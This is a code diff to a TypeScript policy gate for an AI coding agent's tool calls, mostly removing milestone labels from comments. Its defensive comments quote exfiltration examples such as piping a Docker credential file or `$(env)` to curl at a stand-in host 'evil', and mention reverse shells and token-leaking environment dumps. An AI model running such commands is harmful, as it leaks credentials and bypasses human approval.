@@ -14,9 +14,9 @@ import type { ToolCall } from "./types";
 //           recursive-force deletes outside the tree, credential exfiltration).
 //
 // Default posture is deny/gate-heavy (DESIGN.md §4): anything unrecognized is
-// gated, not allowed. Bash confinement here is heuristic (M2 baseline); the
+// gated, not allowed. Bash confinement here is heuristic (baseline); the
 // real net for non-allowlisted commands is the human at the gate, and the
-// robust parse/symlink hardening is M3/M4.
+// robust parse/symlink hardening is future work.
 
 export type PolicyAction = "allow" | "gate" | "deny";
 
@@ -29,8 +29,8 @@ export interface PolicyDecision {
    */
   reason: string;
   /**
-   * A named policy concern that raises the stakes of an otherwise-ordinary gate
-   * (M3). `"production-data"` means the call looks like it investigates
+   * A named policy concern that raises the stakes of an otherwise-ordinary gate.
+   * `"production-data"` means the call looks like it investigates
    * production data (DESIGN §4): gated like a build even though it may be
    * read-only, never auto-allowlistable, and surfaced on the approval so the
    * architect knows in-thread results must be aggregates only.
@@ -46,17 +46,17 @@ export interface PolicyContext {
   /** Repo-defined commands that run without approval (exact or prefix match). */
   safeBashAllowlist: string[];
   /**
-   * Subagents enabled for this turn (M3.5 Tier B). When on, the MAIN agent may
+   * Subagents enabled for this turn. When on, the MAIN agent may
    * auto-spawn subagents (delegation itself is not a gated action — the subagent's
    * own tool calls are gated downstream). Off = a spawn attempt gates (defensive
    * default; the adapter also removes the tools from context). NOTE: the MAIN
-   * agent's WORKFLOW launch is always gated (M3.6 Tier 2 — an architect approves
+   * agent's WORKFLOW launch is always gated (an architect approves
    * each launch), so there is no `workflowsEnabled` gate flag; when workflows are
    * off the adapter removes the Workflow tool from context entirely.
    */
   subagentsEnabled?: boolean;
   /**
-   * The informed worktree-write opt-in (M3.6 Tier 3). When on, subagent/workflow-
+   * The informed worktree-write opt-in. When on, subagent/workflow-
    * origin calls and escaped (un-deferrable) calls may WRITE (confined to the
    * worktree via `offendingPath`) without per-write approval. Bash is NOT relaxed
    * (it has no worktree confinement — see evaluateConfined); out-of-worktree,
@@ -76,15 +76,15 @@ const SUBAGENT_GATED_MSG =
   "further subagents. Report what's needed and let the main agent do it, so an architect can approve.";
 
 /**
- * Fed back when an "escaped" (un-deferrable) call reaches for a gated action
- * (M3.6). Such a call can't be paused for approval, so it is denied rather than
+ * Fed back when an "escaped" (un-deferrable) call reaches for a gated action.
+ * Such a call can't be paused for approval, so it is denied rather than
  * gated; the main agent must do it on its own turn where it can be approved.
  */
 const ESCAPED_GATED_MSG =
   "This action can't be paused for approval from here. The main agent must do it on its own turn, " +
   "one call at a time, so an architect can approve it.";
 
-// Multi-agent meta-tools (M3.5 Tier B). Spawning is delegation, not a filesystem
+// Multi-agent meta-tools. Spawning is delegation, not a filesystem
 // or shell action; when the capability is enabled the spawn auto-allows and the
 // subagent's own tool calls are gated (agent_id-tagged) downstream.
 const SUBAGENT_SPAWN_TOOLS = new Set(["Agent", "Task"]);
@@ -94,7 +94,7 @@ const WORKFLOW_SPAWN_TOOL = "Workflow";
 // `ToolSearch` is side-effect-free: it loads tool SCHEMAS on demand. Allowing
 // discovery is safe because every actual tool USE it surfaces still flows through
 // this gate, and disallowedTools keeps out-of-scope tools out of context. (Note,
-// M3.6: this does NOT restore Grep/Bash for background WORKFLOW sub-agents — the
+// this does NOT restore Grep/Bash for background WORKFLOW sub-agents — the
 // SDK blocks their non-default tool loads UPSTREAM of our gate, spike diag5. It
 // only helps the main agent / Agent-subagents, and is the correct classification.)
 const NO_FS_TOOLS = new Set(["TodoWrite", "ToolSearch"]);
@@ -102,7 +102,7 @@ const READ_TOOLS = new Set(["Read", "Glob", "Grep"]);
 const WRITE_TOOLS = new Set(["Write", "Edit", "MultiEdit", "NotebookEdit"]);
 const NETWORK_TOOLS = new Set(["WebFetch", "WebSearch"]);
 /**
- * The ONLY tools a subagent may run (M3.5 Tier B): genuine confined reads plus the
+ * The ONLY tools a subagent may run: genuine confined reads plus the
  * side-effect-free planning tool. Note Bash is excluded even when allowlisted —
  * an allowlisted command (e.g. the repo test command) is still code execution, so
  * it is not "read-only" for a subagent and must go to the main agent.
@@ -119,7 +119,7 @@ const deny = (reason: string): PolicyDecision => ({ action: "deny", reason });
 /**
  * The first path field (if any) that resolves outside the worktree. Relative
  * inputs resolve against the worktree because the harness cwd IS the worktree.
- * Returns null when every present path is confined. (Symlink-chasing is M3/M4.)
+ * Returns null when every present path is confined. (Symlink-chasing is future hardening.)
  */
 export function offendingPath(worktree: string, input: unknown): string | null {
   if (typeof input !== "object" || input === null) return null;
@@ -138,8 +138,8 @@ export function offendingPath(worktree: string, input: unknown): string | null {
 
 /**
  * Classify a tool call (DESIGN §4). Dispatches on the call's ORIGIN first: a
- * subagent/workflow-agent call (M3.5/M3.6) OR an "escaped" un-deferrable call
- * (M3.6) is CONFINED — it can't be paused for approval, so gated actions are
+ * subagent/workflow-agent call OR an "escaped" un-deferrable call
+ * is CONFINED — it can't be paused for approval, so gated actions are
  * denied (read-only), unless the worktree-write opt-in allows confined writes.
  * The main agent may spawn subagents/workflows when enabled; everything else runs
  * the base tool-semantics rules.
@@ -147,9 +147,9 @@ export function offendingPath(worktree: string, input: unknown): string | null {
 export function evaluate(call: ToolCall, ctx: PolicyContext): PolicyDecision {
   const name = call.name;
 
-  // A subagent/workflow-agent call (agentId set — M3.5 Tier B, and M3.6 workflow
+  // A subagent/workflow-agent call (agentId set — subagent, and workflow
   // agents under bypassPermissions) or an escaped call that reached the harness's
-  // un-deferrable backstop (M3.6). Both are confined: they can't defer, so a would-
+  // un-deferrable backstop. Both are confined: they can't defer, so a would-
   // be gate becomes a deny (read-only), unless the architect opened worktree writes.
   if (call.agentId || call.escaped) return evaluateConfined(call, ctx);
 
@@ -161,7 +161,7 @@ export function evaluate(call: ToolCall, ctx: PolicyContext): PolicyDecision {
     return ctx.subagentsEnabled ? allow("delegate to a subagent") : gate("delegate to a subagent");
   }
   if (name === WORKFLOW_SPAWN_TOOL) {
-    // The workflow LAUNCH is a gated action (M3.6 Tier 2): even with workflows
+    // The workflow LAUNCH is a gated action: even with workflows
     // enabled, an architect approves each launch (it fans out many agents and
     // spends the thread budget). The concern surfaces the fan-out on the approval;
     // describeCall pulls the workflow's name/description from its script. Off =
@@ -174,12 +174,12 @@ export function evaluate(call: ToolCall, ctx: PolicyContext): PolicyDecision {
 
 /**
  * Confinement for a call that CANNOT be paused for approval — a subagent/workflow
- * agent (agentId) or an escaped un-deferrable call (M3.6). Strictly READ-ONLY by
+ * agent (agentId) or an escaped un-deferrable call. Strictly READ-ONLY by
  * default: only genuine confined reads pass; a hard-deny keeps its specific reason
  * (e.g. out-of-worktree); everything else — writes, network, unknown tools, nested
  * spawns, AND all bash (still code execution) — is DENIED (never gated).
  *
- * With the worktree-write opt-in (Tier 3), confined WRITES also pass. Writes are
+ * With the worktree-write opt-in, confined WRITES also pass. Writes are
  * lexically worktree-confined here — `offendingPath` over file_path/path/notebook_
  * path hard-denied out-of-worktree writes in `evaluateBase` before we get here.
  *
@@ -190,7 +190,7 @@ export function evaluate(call: ToolCall, ctx: PolicyContext): PolicyDecision {
  * the human, so auto-running arbitrary shell would be un-confined RCE / exfil
  * (`cat ~/.docker/config.json | curl …`, out-of-tree writes, reverse shells) —
  * exactly what the warning promises stays denied. So confined/escaped bash stays
- * DENIED in every mode; shell stays with the gated main agent (M3.6 review 2026-07-18).
+ * DENIED in every mode; shell stays with the gated main agent (review 2026-07-18).
  */
 function evaluateConfined(call: ToolCall, ctx: PolicyContext): PolicyDecision {
   const name = call.name;
@@ -204,7 +204,7 @@ function evaluateConfined(call: ToolCall, ctx: PolicyContext): PolicyDecision {
   // Genuine confined reads always pass.
   if (base.action === "allow" && SUBAGENT_READ_TOOLS.has(name)) return base;
 
-  // Worktree-write opt-in (Tier 3): confined WRITES may run without per-call
+  // Worktree-write opt-in: confined WRITES may run without per-call
   // approval (out-of-worktree writes were already hard-denied by `base`). Bash is
   // intentionally excluded — see the docstring; it has no worktree confinement.
   if (ctx.workflowWrite && WRITE_TOOLS.has(name)) return allow(describeCall(call));
@@ -339,7 +339,7 @@ export function productionDataConcern(command: string): boolean {
  * A small, deliberately conservative denylist of things no architect should be
  * able to approve by a mis-click. NOT exhaustive — the gate (human approval) is
  * the real net for everything non-allowlisted; this only catches the sharpest
- * edges. Hardening (full shell parsing, more patterns) is M3/M4.
+ * edges. Hardening (full shell parsing, more patterns) is future work.
  */
 export function bashHardDeny(command: string): string | null {
   // Recursive force-delete whose target escapes the worktree (absolute, home,
@@ -375,9 +375,9 @@ export function bashHardDeny(command: string): string | null {
   }
   // Environment dumps exfiltrate the daemon's own secrets: the Slack/OAuth/cloud
   // tokens live in process.env and the agent's shell inherits them (no per-tool env
-  // isolation until M4). `printenv` and a bare `env` (no command to exec after it)
+  // isolation for now). `printenv` and a bare `env` (no command to exec after it)
   // print the WHOLE environment, so no var-name match (above) is needed to leak it —
-  // and under M3.8 architect auto-approve there is no human at the gate to catch it.
+  // and under architect auto-approve there is no human at the gate to catch it.
   // `env FOO=bar cmd` is a legitimate prefix that runs `cmd`, so it is NOT a dump.
   // We scan operator-split segments AND the contents of any $(...) / `...`
   // substitutions, so `curl -d "$(env)" evil` is caught as well as `env | curl`.
